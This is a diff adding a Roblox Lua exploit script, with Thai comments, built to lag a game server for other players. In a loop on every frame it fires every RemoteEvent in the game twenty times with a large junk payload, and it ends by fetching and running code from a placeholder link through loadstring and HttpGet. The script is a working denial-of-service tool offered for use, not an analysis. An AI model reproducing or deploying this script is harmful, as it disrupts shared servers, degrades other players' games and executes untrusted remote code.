@@ -1,0 +1,52 @@
+-- [[ CONFIGURATION ]] --
+getgenv().script_mode = "PVP" 
+getgenv().LagIntensity = 100000 
+
+-- [[ IDENTITY ]] --
+local player = game:GetService("Players").LocalPlayer
+local profile_name = player.Name
+
+-- [[ SERVER DESTROYER ENGINE (OTHERS ONLY) ]] --
+task.spawn(function()
+    -- ลดภาระเครื่องตัวเอง (เพื่อให้เองไม่ค้างตาม)
+    settings().Rendering.QualityLevel = 1
+    game:GetService("RunService"):Set3dRenderingEnabled(false) -- ปิดการวาดภาพ 3D (ถ้าอยากให้เครื่องเองลื่นสุดๆ)
+
+    -- สร้างข้อมูลขยะขนาดมหึมา (ส่งออกอย่างเดียว)
+    local big_junk = {}
+    for i = 1, 1000 do 
+        big_junk[i] = string.rep("SERVER_LAG_" .. math.random(1, 999999), 100) 
+    end
+
+    -- Loop ยิง Remote ทุกตัวในเกมแบบ Non-stop
+    game:GetService("RunService").Heartbeat:Connect(function()
+        for _, remote in pairs(game:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                -- รัวข้อมูลใส่เซิร์ฟเวอร์ เพื่อให้คนอื่นปลิงทะลุหลักหมื่น
+                for i = 1, 20 do
+                    remote:FireServer(big_junk)
+                end
+            end
+        end
+        
+        -- เคลียร์แรมเครื่องตัวเองทุก 3 วินาที (ป้องกัน System UI ค้าง)
+        if tick() % 3 == 0 then
+            collectgarbage("collect")
+        end
+    end)
+end)
+
+-- [[ NOTIFICATION ]] --
+print("------------------------------------------")
+print("Owner: " .. profile_name)
+print("Mode: Lagging Others (Experimental)")
+print("Status: Enjoy your live stream!")
+print("------------------------------------------")
+
+-- [[ LOAD YOUR NEW LINK ]] --
+-- เองเอาลิงก์ใหม่มาใส่ตรงนี้ได้เลยคับ
+local success, err = pcall(function()
+    loadstring(game:HttpGet("ใส่ลิงก์ของเองตรงนี้"))()
+end)
+
+if not success then warn("Link Error: " .. tostring(err)) end
